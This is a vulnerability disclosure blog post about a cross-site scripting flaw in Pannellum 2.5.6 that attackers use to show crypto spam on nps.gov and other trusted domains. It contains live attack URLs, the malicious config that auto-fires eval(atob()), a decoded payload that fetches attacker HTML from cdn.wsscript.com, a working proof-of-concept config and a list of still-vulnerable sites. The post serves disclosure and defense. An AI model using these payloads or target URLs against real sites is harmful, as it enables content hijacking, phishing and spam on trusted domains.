---
title: "Zero Day Live: Pannellum 2.5.6"
tags: ["security", "zero-day"]
comments: []
---

The US National Park Service runs nps.gov, a trusted .gov domain on the internet. Right now, if you cilck a special link, your browser address bar shows nps.gov but the page shows crypto spam about Solana NFTs. The page was indexed in Google News. Here is how the entire attack works, step by step.

![Crypto spam displayed on nps.gov](/assets/images/zero-day-pannellum.webp)

## Walkthrough

{: .margin-note}
⚠️ For live attack URLs, use incognito mode and do not believe anything you see in this window.

Here is a live attack URL:

> https://www.nps(.)gov/hdp/scripts/pannellum/pannellum.htm?config=/\\/cdn.wsscript.com/gov/article/tensor-solana-nft.txt

Your browser address bar will show `www.nps.gov/defi/tensor-solana-nft`. The page content will be an article titled "Tensor Solana Nft" with a video player, SEO markup, and crypto marketing text. None of this content has anything to do with the National Park Service.

This URL was also distributed through Google News RSS, using the redirect at (WARNING LIVE ATTACK URL):

> https://news.google(.)com/rss/articles/CBMi1gFBVV95cUxON3dKcGJLNkU4SVF3SmxyT3V4RlR0VW1XOGkwckx0ZURSQkZ1MThuWW5xODVOcnVOeUFOMnNzUU15VXFQWU5JdlM4MnNpOHJKVk1IYzRSaTNISlJSb1JZYUJuWEoxX3ZjWmFqRGNiRFdaOXdkMDl6ZTdlTG14M0lmaUtOZVd2NElQRU1OaHFHS3A1YVBvbl9RbThsdVQ1Ukc4VEtZY3VabGUtWnVwejhVc3N5R3hFM0xDZmtiaE5pY1RCRUVVb1REOVFQVk1mV2FtUzN3UG1n?oc=5

Google News decoded that link and sent visitors to the nps.gov URL above.

We have seen thousands of other sites affected that were exploited.

## Impact

Search results and AI scraping collect these pages, causing affected search results and reasoning from these pages to reflect remote assets from attackers for SEO articles rather than the intended site content via a method of cross-site scripting.

This issue allows an unauthenticated attacker to use a legitimate domain as the delivery surface for attacker-controlled content. By supplying a remote configuration file to the exposed Pannellum viewer, the attacker can construct a URL that appears to remain on the affected ".gov" or ".edu" domain while displaying content and links controlled from external infrastructure. No compromise of the affected web server is required. 

An attacker could use this capability to:

- Create convincing phishing, cyrptocurrency, or credential harvesting lures/harvest domain session tokens automatically under certain circumstances, that inherit the credibility of the affected organization. 
- Manipulate page content and browser history to make the malicious instance appear native to the trusted site.
- Evade detection due to editing the resulting page via the Pannellum config, with resulting attempts to analyze the compromise appearing as a 404 error on the surface.
- Improve the visibility and credibility of malicious content through search engine indexing, news aggregation, link previews, and AI retrieval systems.
- Reuse the same attack pattern across other sites hosting similarly configured Pannellum viewers.

**This pattern is reusable and actively exploited at scale.** The same attacker infrastructure (using domains like `cdn.wsscript.com`, `nn.kostoom.com`, `anni.ie`, `sdntoper.top`, and `cdn.taddd.net`) is targeting multiple high-trust domains simultaneously with Pannellum viewers. The attacker simply prepares a config file and constructs a URL for each target — no server compromise needed.

Severity rating:

- (For SEO impact) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
- (For account takeover) CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N 7.4

## How the attack works

The attack exploits a single feature of a [legitimate open-source tool](https://pannellum.org/) that nps.gov hosts. Here is the full chain, built from the bottom up.

### Step 1: Find an affected page.

The nps.gov website hosts [Pannellum](https://pannellum.org/), an open-source panoramic image viewer, at:

```javascript
https://www.nps.gov/hdp/scripts/pannellum/pannellum.htm
```

This is a legitimate tool used for 360° panorama images of historic sites. Pannellum is designed to accept a `config` query parameter containing the URL of a JSON configuration file. The viewer fetches that JSON via and uses it to set up the panorama display.

Here is what this widget is supposed to look like when it is working. It is beautiful.

![Pannellum displaying a panorama as intended](/assets/images/zero-day-pannellum-2.webp)

The critical issue: there is no restriction on what URL the `config` parameter can point to. It does not have to be from that same publisher.

### Step 2: Craft a config URL that points to an external server.

The `config` parameter is parsed from the query string and fetched by the JavaScript. The attacker uses a different host but hides the `//` part by using an equivalent encoding `/\/`.

```javascript
?config=/\/cdn.wsscript.com/gov/article/tensor-solana-nft.txt
```

Now the Pannellum viewer running on nps.gov fetches and parses a JSON config file controlled entirely by the attacker on any domain.

### Step 3: Build a new Pannellum config with XSS.

The attacker's config file at `cdn.wsscript.com/gov/article/tensor-solana-nft.txt` is a valid Pannellum JSON config. It loads a real photo so the viewer initializes normally. But it also injects HTML attributes:

```javascript
{
  "autoLoad": true,
  "panorama": "https://pannellum.org/images/cerro-toco-0.jpg",
  "hotSpots": [
    {
      "pitch": 0,
      "yaw": 0,
      "type": "info",
      "URL": "#",
      "attributes": {
        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:100px; height:100px; z-index:99999; animation: pnlm-mv 0.001s 1 forwards",
        "onanimationstart": "eval(atob(\"...\"))"
      }
    }
  ]
}
```

The hotspot's `style` attribute applies a CSS animation that completes in 0.001 seconds. This fires the `onanimationstart` event handler automatically, with no user interaction required.

Broad lesson: countermeasures should use allowlist instead of a denylist. Denylists are not well suited as a countermeasure.

### Step 4: The JavaScript payload replaces the entire page.

The `onanimationstart` handler runs `eval(atob("..."))`, which decodes to:

```javascript
fetch('https://cdn.wsscript.com/gov/how-to/tensor-solana-nft.txt')
  .then(r => r.text())
  .then(h => {
    document.open();
    document.write(h);
    document.close();
  })
```

This fetches a second (HTML) file from the attacker's server and calls `document.write()` to completely replace the page content. Because JavaScript is running in the context of nps.gov, the browser address bar still shows nps.gov throughout this process.

### Step 5: The replacement page fakes the URL and serves content.

The injected HTML page does a few things;

1. **Rewrites the visible URL** using `history.replaceState()` to change the path to `/defi/tensor-solana-nft`, making the address bar look even more like a real nps.gov page. This is more believable.
2. **Detects search engine crawlers** with a regex check for `googlebot|bingbot|adsbot` in the user agent. If a crawler visits, the page serves clean content optimized for search indexing. Human visitors get the full replacement.

## Demonstration proof without harm

We have deployed a configuration file to prove the effect without any harm. This allows us to contact affected people and explain the problem.

[https://apps.phor.net/csh-panorama/config-pannellum2.php](https://apps.phor.net/csh-panorama/config-pannellum2.php)

It is designed to study and avoids the obfuscation of the real attacks.

```php
<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}
?>{
  "autoLoad": true,
  "panorama": "https://pannellum.org/images/cerro-toco-0.jpg",
  "hotSpots": [
    {
      "URL": "#",
      "attributes": {
        "style": "animation: pnlm-mv 0.001s 1 forwards",
        "onanimationstart": "document.open();document.write(\"<html><body style=font-family:system-ui;padding:2em><h1>This page content has been replaced using a technique described on the Community Service Hour podcast.</h1></body></html>\");document.close();history.pushState(null, \"\", \"/a-nonexistent-page\")"
      }
    }
  ]
}
```

## Other affected websites

Sites that run Pannellum 2.5.6 or before are affected. This was fixed in 2.5.7 ([see diff](https://github.com/mpetroff/pannellum/compare/2.5.6...2.5.7#diff-4ad44a75110f664b18382204514563dfc2958af441216ab07a34f27e0252e97eR62-R66)).

We demonstrate using our proof without harm.

This list may be outdated by the time you read this.

- <https://www.kap.co.jp/facility/hall/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.square-hitachi.jp/wp-content/themes/cp-hotel/panorama/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.inceptapharma.com/vtours-xs/index.html?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://cdn.biola.edu/event_services/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.keele.ac.uk/docs/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://library.missouri.edu/code/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.hrr.mlit.go.jp/360/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.bu.edu/housing/wp-content/themes/r-housing/js/vendor/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://www.hoteldealborada.com/scw/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
- <https://visit.gallaudet.edu/wp-content/themes/gallaudet-virtual-tour/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>

## Attack attribution

The attack infrastructure uses several domains that serve different roles. Some host configuration files (the Pannellum JSON or krpano XML that triggers the XSS), some host the replacement HTML pages, and some host tracking or monetization scripts loaded after the page is taken over.

Hosting malicious files on a domain does not necessarily mean the domain's operator is responsible for the attack. Servers can be compromised through their own vulnerabilities (a so-called watering hole attack), and attackers frequently upload files to servers they have broken into. That said, these domains warrant investigation.

### Participating servers for configuration and content

These domains host the config files that trigger the XSS and the replacement HTML pages that hijack the victim site, and related scripts:

| **Domain**       | **Role**                                                     | **Registrar** | **Created** |
| ---------------- | ------------------------------------------------------------ | ------------- | ----------- |
| cdn.wsscript.com | Hosts Pannellum JSON configs, krpano XML configs, and replacement HTML for nps.gov and CNN attacks | NameCheap     | 2023-12-22  |
| nn.kostoom.com   | Hosts Pannellum JSON configs used in Boston University attacks | Tucows        | 2015-10-27  |
| anni.ie          | Hosts Pannellum JSON configs used in Boston University and Biola University attacks | —             | —           |
| b.sdntoper.top   | Serves tracking script `evm.js` loaded in nps.gov attacks    | —             | —           |
| cdn.taddd.net    | Serves tracking script `dll.js` loaded in CNN attacks        | Cloudflare    | 2026-01-12  |

The domain anni.ie belongs to the Association of Nigerian Nurses in Ireland, a legitimate organization. Their website runs [Kopage](https://www.kopage.com/) (a website builder). This domain may itself be a compromised server being used to host attacker files without the organization's knowledge.

The domain cdn.taddd.net was registered only one month before this writeup, which is consistent with attacker infrastructure that rotates frequently.

Attribution and enumeration can work back-and-forth. As you find staging servers that host the configuration, this can be used to find new affected hosts, and vice-versa.

- The full list of 284 URLs is available in the sitemap at the root of cdn.wsscript(.)com.
- Another list on palmaeduca(.)es/fotos/
- Exploited pages were found indexed with topics including "trading algorithms" and "Bitcoin inscriptions."
- Do backlink analysis of the found pages.

## Recommendations

1. Website publishers should update Pannellum to version 2.5.7 or later.
2. Monitor your web server access logs using a tool to detect indicators of abuse, such as `?...//` and similar.
3. Google News should validate that the final URL after redirects actually serves consistent content and is not an open redirect.

## Future research

Additional research paths are available that we did not explore.

1. Repeat this research for krpano version 1.17-pr2, 1.20.12. The CNN Edition website was affected by this. And other sites might be too.

## Test date

February 2026 through October 2026

## Acknowledgements

Thank you to the many contributors here for preparing command line approaches, looking up contact information, discussing the ethical approach we are using here and providing the motivation to get through an afternoon to help some random other souls out there who's websites might be misconfigured. 

- William Entriken [https://x.com/fulldecent](https://x.com/fulldecent) 
- Christy Caraballo [https://x.com/pwncmd](https://x.com/pwncmd)
- sshpunk [https://x.com/sshpunk](https://x.com/sshpunk)
- Doc72 [https://x.com/Doc72\_](https://x.com/Doc72_)
- kamigold

## Disclosure timeline

- 2026-02-10 [Publicly reported](https://x.com/fulldecent/status/2021340939017650493) on X, but I failed to explain the actual vulnerability properly
- 2026-02-13 This writeup with full technical explanation
- 2026-10-05 Full blog post